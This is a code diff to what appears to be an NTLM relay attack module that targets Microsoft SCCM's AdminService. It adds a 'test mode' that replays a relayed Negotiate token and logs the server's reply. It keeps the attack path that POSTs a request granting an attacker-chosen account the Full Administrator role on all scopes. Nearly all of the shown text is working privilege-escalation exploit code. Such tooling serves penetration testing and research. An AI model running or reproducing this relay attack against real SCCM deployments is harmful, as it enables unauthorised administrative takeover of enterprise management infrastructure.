@@ -23,12 +23,15 @@ import base64
 ELEVATED = []
 
 class ADMINSERVICEAttack:
-    def _run(self):       
+    def _run(self):
         # slightly modfied sendAuth func from httprelayclient.py reused here due to negotiate auth,
         # requring all action to be performed in one shot
-        if self.username in ELEVATED:
-            LOG.info('Skipping user %s since attack was already performed' % self.username)
-            return
+
+        # In test mode, we don't skip users - we want to test repeatedly
+        if not self.config.testAdminService:
+            if self.username in ELEVATED:
+                LOG.info('Skipping user %s since attack was already performed' % self.username)
+                return
         
         if unpack('B', self.config.sccmAdminToken[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(self.config.sccmAdminToken)
@@ -63,23 +66,68 @@ class ADMINSERVICEAttack:
         auth = base64.b64encode(token).decode("ascii")
         headers = {'Authorization':'%s %s' % ('Negotiate', auth),'Content-Type': 'application/json; odata=verbose'}
 
+        # Test mode: just test authentication with GET request
+        if self.config.testAdminService:
+            LOG.info('Testing AdminService authentication (test mode - no attack)...')
+            LOG.debug(f'Request URL: /AdminService/wmi/SMS_Admin')
+            LOG.debug(f'Request headers: {headers}')
+            LOG.debug(f'Token (base64): {auth[:80]}...')
+
+            self.client.request("GET", '/AdminService/wmi/SMS_Admin', headers=headers)
+            res = self.client.getresponse()
+
+            LOG.info(f'=== AdminService Authentication Test Result ===')
+            LOG.info(f'HTTP Status: {res.status} {res.reason}')
+            LOG.info(f'Response Headers:')
+            for header, value in res.getheaders():
+                LOG.info(f'  {header}: {value}')
+
+            # Read response body
+            response_body = res.read()
+            if response_body:
+                try:
+                    response_text = response_body.decode('utf-8')
+                    LOG.info(f'Response Body ({len(response_body)} bytes):')
+                    LOG.info(response_text)
+                except:
+                    LOG.info(f'Response Body ({len(response_body)} bytes, binary):')
+                    LOG.info(response_body[:500])
+            else:
+                LOG.info('Response Body: (empty)')
+
+            # Analyze result
+            if res.status == 200:
+                LOG.info('[+] SUCCESS: Authentication accepted (200 OK)')
+            elif res.status == 401:
+                LOG.error('[-] FAILED: Authentication rejected (401 Unauthorized)')
+            elif res.status == 403:
+                LOG.info('[+] Authentication succeeded but insufficient permissions (403 Forbidden)')
+            elif res.status == 500:
+                LOG.info('[?] Server error (500) - authentication may have succeeded')
+            else:
+                LOG.info(f'[?] Unexpected status: {res.status}')
+
+            LOG.info('=== End Test Result ===')
+            return
+
+        # Normal attack mode: POST to create admin
         data = {
-            "LogonName": self.config.logonname, 
+            "LogonName": self.config.logonname,
             "AdminSid": self.config.objectsid,
             "Permissions": [
                 {
-                    "CategoryID": "SMS00ALL", 
-                    "CategoryTypeID": 29, 
+                    "CategoryID": "SMS00ALL",
+                    "CategoryTypeID": 29,
                     "RoleID":"SMS0001R",
                 },
                 {
                     "CategoryID": "SMS00001",
-                    "CategoryTypeID": 1, 
-                    "RoleID":"SMS0001R", 
+                    "CategoryTypeID": 1,
+                    "RoleID":"SMS0001R",
                 },
                 {
-                    "CategoryID": "SMS00004", 
-                    "CategoryTypeID": 1, 
+                    "CategoryID": "SMS00004",
+                    "CategoryTypeID": 1,
                     "RoleID":"SMS0001R",
                 }
             ],
